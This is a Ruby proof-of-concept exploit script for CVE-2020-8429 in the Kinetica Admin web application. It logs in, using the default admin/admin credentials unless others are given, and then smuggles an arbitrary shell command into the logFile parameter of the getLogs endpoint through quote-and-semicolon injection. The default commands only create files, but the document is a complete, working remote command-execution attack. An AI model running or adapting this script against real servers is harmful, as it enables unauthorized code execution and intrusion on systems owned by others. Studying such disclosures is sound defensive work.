#!/usr/bin/env ruby 
##
# POC for CVE-2020-8429 Kinetica Admin web application version 7.0.9.2.20191118151947 
##

require 'rex'

host = ARGV[0]
user = ARGV[1] || "admin"
pass = ARGV[2] || "admin"
cmd  = ARGV[3] || "touch LALO.txt"

def usage
 puts "[*] #{$0} <host> <user> <passwd> [cmd]"
 exit
end

usage if ARGV.size < 3

begin

sock = Rex::Proto::Http::Client.new(host, 
                                    port = "8080", 
                                    context = {}, 
                                    ssl = false)

req = sock.request_raw(
{
        'uri'     => "/gadmin/",
        'version' => '1.1',
        'method'  => 'GET',
        'headers' =>
           {
             'DNT' => '1',
             'Connection' => 'close',
             'Upgrade-Insecure-Requests' => '1',
             'Cache-Control' => 'max-age=0',
           },
})

sock.send_request(req)
data = sock.read_response()

if data and data.code == 302
 jsession = data.get_cookies.gsub(/;/,"")

 req = sock.request_cgi(
 {
	'uri'     => "/gadmin/resources/auth/login",
	'version' => '1.1',
	'method'  => 'POST',
        'ctype'   => 'application/json',
        'cookie'  => jsession,
        'data'    => %Q|{"username":"#{user}","password":"#{pass}"}|,
        'headers' =>
           {
             'Referer' => "http://#{host}:8080/gadmin/login.html?redirect=/gadmin/",
             'DNT' => '1',
             'Connection' => 'close',
           },
 })

 sock.send_request(req)
 data = sock.read_response()

  if data and data.code == 200

   doit = Rex::Text.uri_encode(cmd)   

   req = sock.request_raw(
   {                                                                                                       
        'uri'     => "/gadmin/resources/gpudbManager/getLogs?logFile=gpudb.log';#{doit};'&lastNumberOfLines=1",
        'version' => '1.1',
        'method'  => 'GET',
        'cookie'  => jsession,
        'headers' =>
           {
             'DNT' => '1',
             'Connection' => 'close',
             'Upgrade-Insecure-Requests' => '1',
             'Cache-Control' => 'max-age=0',
           },
    })
   
   puts "[x] Sending command: #{doit}\n"
   sock.send_request(req)
   data = sock.read_response()

   puts data.body

  else
   puts "[!] Error"
  end

 else
 puts "[!] Error"
end
rescue => e
 puts "[!] #{e.to_s}"
end
__END__
"python -c 'import os;os.system(\"touch cat.txt\");'"
